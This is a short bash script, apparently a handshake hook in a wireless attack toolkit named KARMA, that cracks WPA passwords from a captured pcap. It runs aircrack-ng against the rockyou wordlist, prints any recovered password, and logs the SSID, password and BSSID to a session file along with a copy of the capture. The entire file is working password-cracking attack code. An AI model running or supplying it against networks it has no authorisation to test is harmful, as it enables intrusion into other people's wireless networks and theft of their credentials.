#!/bin/bash
# Args: $1=pcap  $2=essid  $3=bssid
# Env:  KARMA_OUT — write cracked password there too

PCAP="$1"; ESSID="$2"; BSSID="$3"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
[[ ! -f "$WORDLIST" ]] && WORDLIST="on_handshake/rockyou.txt"
CRACKED_FILE="handshakes/${ESSID}.txt"
OUT="${KARMA_OUT:-}"

echo "[*] bruteforcing WPA: $ESSID"

# Run aircrack in background, wait for result
aircrack-ng -w "$WORDLIST" "$PCAP" -l "$CRACKED_FILE" -q 2>/dev/null &
ACRACK_PID=$!
wait $ACRACK_PID || true

if [[ -s "$CRACKED_FILE" ]]; then
  PASS="$(cat "$CRACKED_FILE")"
  echo "[+] CRACKED: $ESSID  ->  $PASS"
  # Write to KARMA session summary if available
  if [[ -n "$OUT" && -f "$OUT/session.txt" ]]; then
    printf '\n# WPA Crack Result\nSSID     : %s\nPassword : %s\nBSSID    : %s\nTime     : %s\n' \
      "$ESSID" "$PASS" "$BSSID" "$(date '+%Y-%m-%d %H:%M:%S')" >> "$OUT/session.txt"
    cp "$PCAP" "$OUT/" 2>/dev/null || true
  fi
else
  echo "[-] WPA not cracked: $ESSID (wordlist exhausted)"
fi
